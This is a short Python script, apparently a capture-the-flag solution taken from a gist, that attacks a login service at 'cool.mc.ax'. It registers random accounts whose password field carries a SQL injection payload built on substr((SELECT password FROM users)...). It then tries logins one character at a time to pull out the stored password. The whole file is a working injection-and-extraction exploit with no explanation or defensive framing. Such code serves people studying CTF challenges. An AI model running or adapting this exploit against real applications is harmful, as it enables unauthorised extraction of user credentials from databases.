#From https://gist.github.com/arxenix/9e6c197af57f962b893054c2c23eb96f
#!/usr/bin/env python3 
import requests
import random
allowed_characters = set(
    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
)
def gen_username():
    return ''.join(
        random.choice(list(allowed_characters)) for _ in range(10)
    )

def reg(user, pwd):
    r = requests.post('https://cool.mc.ax/register', data={'username': user, 'password': pwd}).content
    print(r)
    return r


def login(user, pwd):
    r = requests.post('https://cool.mc.ax/', data={'username': user, 'password': pwd}).content
    return b"Incorrect" not in r

import string
password_charset = string.printable


password = ""
while True:
    u = gen_username()
    print("user", u)
    len_to_get = len(password)+1
    r = reg(u, f"'||substr((SELECT password FROM users),1,{len_to_get}))--")
    if b"Internal" in r:
        print("INTERNAL SERVER ERR")
        continue
    for c in password_charset:
        if login(u, password + c):
            password += c
            print("PASSWORD", password)
            break
        else:
            print("not", password + c)